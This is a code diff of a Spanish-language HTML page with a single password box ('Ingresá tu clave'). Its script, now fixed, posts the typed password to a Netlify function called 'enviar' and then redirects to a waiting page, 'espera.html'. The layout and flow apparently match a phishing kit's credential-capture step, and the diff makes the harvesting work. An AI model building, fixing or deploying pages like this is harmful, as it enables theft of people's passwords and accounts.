@@ -19,34 +19,16 @@
     </div>
 
     <!-- Card login -->
-  <div class="login-card">
-  <div class="login-title">Ingresá tu clave</div>
+    <div class="login-card">
+        <div class="login-title">Ingresá tu clave</div>
 
-  <input type="text" id="claveInput" placeholder="Clave">
+        <input type="text" id="claveInput" placeholder="Clave">
 
-  <button class="btn-accept" onclick="enviarClave()">
-    <span class="check">✔</span>
-    Aceptar
-  </button>
-</div>
-
-<script>
-function enviarClave() {
-  const clave = document.getElementById("claveInput").value;
-
-  fetch("/.netlify/functions/enviar", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      tipo: "clave",
-      valor: clave
-    })
-  });
-}
-</script>
-
-
-
+        <button type="button" class="btn-accept" onclick="enviarClave()">
+            <span class="check">✔</span>
+            Aceptar
+        </button>
+    </div>
 
     <!-- Footer -->
     <footer class="footer">
@@ -56,16 +38,22 @@ function enviarClave() {
 
     <!-- Script -->
     <script>
-    fetch("/.netlify/functions/enviar", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-        tipo: "clave",
-        valor: clave
-    })
-}).finally(() => {
-    window.location.href = "espera.html";
-});
+    function enviarClave() {
+        const clave = document.getElementById("claveInput").value;
+
+        fetch("/.netlify/functions/enviar", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                tipo: "Clave",
+                valor: clave
+            })
+        })
+        .finally(() => {
+            window.location.href = "espera.html";
+        });
+    }
+    </script>
 
 </body>
 </html>
